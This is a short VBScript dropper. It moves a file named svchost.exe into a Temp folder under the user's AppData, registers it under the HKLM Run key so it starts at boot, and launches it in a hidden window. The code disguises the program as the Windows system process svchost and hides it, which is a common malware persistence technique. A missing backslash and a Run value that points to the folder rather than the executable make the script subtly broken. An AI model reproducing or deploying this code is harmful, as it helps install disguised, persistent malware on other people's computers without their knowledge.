Set objShell = Wscript.CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("Wscript.Network")
usr = objNetwork.UserName
SourcePath = objFSO.GetAbsolutePathName(".")
destDir = "C:\Users\" & usr & "\AppData\Local\Temp\svchost"
objFSO.CreateFolder(destDir)
objFSO.MoveFile (SourcePath & "\svchost.exe"), (destDir & "\svchost.exe")
objShell.RegWrite "HKLM\Software\Microsoft\Windows\Currentversion\Run\svchost",destDir, "REG_SZ"
objShell.Run destDir & "svchost.exe", 0, True
WScript.Quit